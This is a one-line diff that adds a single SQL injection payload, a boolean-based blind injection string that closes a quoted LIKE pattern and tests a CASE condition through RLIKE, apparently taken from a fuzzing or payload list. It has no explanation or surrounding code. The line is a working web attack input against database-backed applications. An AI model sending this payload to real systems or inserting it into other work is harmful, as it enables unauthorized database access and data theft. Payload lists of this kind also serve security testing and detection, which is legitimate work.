@@ -1,0 +1,1 @@
+1%")) rlike (select (case when (4207=1757) then 1 else 0x28 end)) and (("%"="
